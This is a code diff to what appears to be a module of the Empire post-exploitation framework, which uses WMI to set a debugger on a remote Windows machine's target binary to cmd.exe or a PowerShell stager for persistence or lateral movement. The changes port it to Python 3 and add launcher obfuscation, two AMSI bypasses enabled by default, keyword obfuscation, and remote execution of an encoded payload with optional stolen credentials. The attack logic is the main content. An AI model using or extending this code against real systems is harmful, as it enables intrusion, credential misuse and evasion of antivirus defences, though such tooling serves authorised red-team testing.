@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -11,6 +17,10 @@ class Module:
 
             'Description': ('Uses WMI to set the debugger for a target binary on a remote '
                             'machine to be cmd.exe or a stager.'),
+
+            'Software': '',
+
+            'Techniques': ['T1047'],
 
             'Background' : False,
 
@@ -51,8 +61,28 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'UserName' : {
-                'Description'   :   '[domain\]username to use to execute command.',
+                'Description'   :   r'[domain\]username to use to execute command.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -69,12 +99,12 @@ class Module:
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
-                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
+                'Value'         :   r'HKLM:Software\Microsoft\Network\debug'
             },
             'Binary' : {
                 'Description'   :   'Binary to set for the debugger.',
                 'Required'      :   False,
-                'Value'         :   'C:\Windows\System32\cmd.exe'
+                'Value'         :   r'C:\Windows\System32\cmd.exe'
             },
             'Cleanup' : {
                 'Description'   :   'Switch. Disable the debugger for the specified TargetBinary.',
@@ -97,6 +127,10 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
 
         # management options
         cleanup = self.options['Cleanup']['Value']        
@@ -105,6 +139,13 @@ class Module:
         listenerName = self.options['Listener']['Value']
         userName = self.options['UserName']['Value']
         password = self.options['Password']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         # storage options
         regPath = self.options['RegPath']['Value']
@@ -117,7 +158,7 @@ class Module:
         if credID != "":
             
             if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
+                print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
             (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
@@ -139,12 +180,12 @@ class Module:
             # if there's a listener specified, generate a stager and store it
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -179,14 +220,18 @@ class Module:
         computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
 
         script += " -ComputerName @("+computerNames+")"
-        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload + "\""
+        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload.decode('UTF-8') + "\""
 
         # if we're supplying alternate user credentials
         if userName != '':
             script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
 
         script += ";'Invoke-Wmi executed on " +computerNames + statusMsg+"'"
+
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
 
